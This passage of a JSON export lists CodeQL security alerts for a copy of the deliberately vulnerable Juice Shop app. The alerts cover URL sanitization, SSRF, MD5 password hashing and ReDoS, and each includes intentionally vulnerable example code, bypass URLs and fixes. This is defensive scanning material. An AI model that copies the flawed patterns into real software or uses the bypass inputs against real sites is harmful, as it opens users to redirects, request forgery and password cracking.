by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"'://htmledit.squarefree.com' can be anywhere in the URL, and arbitrary hosts may come before or after it."},"location":{"path":"routes/updateUserProfile.ts","start_line":24,"end_line":24,"start_column":16,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/5/instances","dismissal_approved_by":null},{"number":4,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/4","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/4","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-url-substring-sanitization","severity":"warning","description":"Incomplete URL substring sanitization","name":"js/incomplete-url-substring-sanitization","tags":["correctness","external/cwe/cwe-020","security"],"full_description":"Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.","help":"# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled by an attacker\n    if (host.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param('url'),\n        host = urlLib.parse(url).host;\n    // GOOD: the host of `url` can not be controlled by an attacker\n    let allowedHosts = [\n        'example.com',\n        'beta.example.com',\n        'www.example.com'\n    ];\n    if (allowedHosts.includes(host)) {\n        res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"'://htmledit.squarefree.com' can be anywhere in the URL, and arbitrary hosts may come before or after it."},"location":{"path":"routes/updateUserProfile.ts","start_line":23,"end_line":23,"start_column":22,"end_column":80},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/4/instances","dismissal_approved_by":null},{"number":3,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/3","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/3","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/request-forgery","severity":"error","description":"Server-side request forgery","name":"js/request-forgery","tags":["external/cwe/cwe-918","security"],"full_description":"Making a network request with user-controlled data in the URL allows for request forgery attacks.","help":"# Server-side request forgery\nDirectly incorporating user input in the URL of an outgoing HTTP request can enable a request forgery attack, in which the request is altered to target an unintended API endpoint or resource. If the server performing the request is connected to an internal network, this can give an attacker the means to bypass the network boundary and make requests against internal services. A forged request may perform an unintended action on behalf of the attacker, or cause information leak if redirected to an external server or if the request response is fed back to the user. It may also compromise the server making the request, if the request response is handled in an unsafe way.\n\n\n## Recommendation\nRestrict user inputs in the URL of an outgoing request, in particular:\n\n* Avoid user input in the hostname of the URL. Pick the hostname from an allow-list instead of constructing it directly from user input.\n* Take care when user input is part of the pathname of the URL. Restrict the input so that path traversal (\"`../`\") cannot be used to redirect the request to an unintended endpoint.\n\n## Example\nThe following example shows an HTTP request parameter being used directly in the URL of a request without validating the input, which facilitates an SSRF attack. The request `http.get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `\"internal.example.com/#\"` as the target, causing the URL used in the request to be `\"https://internal.example.com/#.example.com/data\"`.\n\nA request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.\n\n\n```javascript\nimport http from 'http';\n\nconst server = http.createServer(function(req, res) {\n    const target = new URL(req.url, \"http://example.com\").searchParams.get(\"target\");\n\n    // BAD: `target` is controlled by the attacker\n    http.get('https://' + target + \".example.com/data/\", res => {\n        // process request response ...\n    });\n\n});\n\n```\nOne way to remedy the problem is to use the user input to select a known fixed string before performing the request:\n\n\n```javascript\nimport http from 'http';\n\nconst server = http.createServer(function(req, res) {\n    const target = new URL(req.url, \"http://example.com\").searchParams.get(\"target\");\n\n    let subdomain;\n    if (target === 'EU') {\n        subdomain = \"europe\"\n    } else {\n        subdomain = \"world\"\n    }\n\n    // GOOD: `subdomain` is controlled by the server\n    http.get('https://' + subdomain + \".example.com/data/\", res => {\n        // process request response ...\n    });\n\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The URL of this request depends on a user-provided value."},"location":{"path":"routes/profileImageUrlUpload.ts","start_line":22,"end_line":23,"start_column":30,"end_column":20},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/3/instances","dismissal_approved_by":null},{"number":2,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/2","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/2","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/insufficient-password-hash","severity":"warning","description":"Use of password hash with insufficient computational effort","name":"js/insufficient-password-hash","tags":["external/cwe/cwe-916","security"],"full_description":"Creating a hash of a password with low computational effort makes the hash vulnerable to password cracking attacks.","help":"# Use of password hash with insufficient computational effort\nStoring cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.\n\nA good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.\n\n\n## Recommendation\nUse a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.\n\n\n## Example\nIn the example below, the `md5` algorithm computes the hash of a password.\n\n\n```javascript\nconst crypto = require(\"crypto\");\nfunction hashPassword(password) {\n    var hasher = crypto.createHash('md5');\n    var hashed = hasher.update(password).digest(\"hex\"); // BAD\n    return hashed;\n}\n\n```\nThis is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:\n\n\n```javascript\nconst bcrypt = require(\"bcrypt\");\nfunction hashPassword(password, salt) {\n  var hashed = bcrypt.hashSync(password, salt); // GOOD\n  return hashed;\n}\n\n```\n\n## References\n* OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Password from an access to password is hashed insecurely.\nPassword from an access to password is hashed insecurely.\nPassword from an access to clearTextPassword is hashed insecurely.\nPassword from an access to password is hashed insecurely.\nPassword from an access to password is hashed insecurely.\nPassword from an access to currentPassword is hashed insecurely.\nPassword from an access to currentPassword is hashed insecurely.\nPassword from an access to password is hashed insecurely."},"location":{"path":"lib/insecurity.ts","start_line":43,"end_line":43,"start_column":71,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/2/instances","dismissal_approved_by":null},{"number":1,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/1","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/1","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/polynomial-redos","severity":"warning","description":"Polynomial regular expression used on uncontrolled data","name":"js/polynomial-redos","tags":["external/cwe/cwe-1333","external/cwe/cwe-400","external/cwe/cwe-730","security"],"full_description":"A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.","help":"# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This regular expression that depends on a user-provided value may run slow on strings with many repetitions of 'a'."},"location":{"path":"routes/profileImageUrlUpload.ts","start_line":19,"end_line":19,"start_column":11,"end_column":62},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/1/instances","dismissal_approved_by":null}]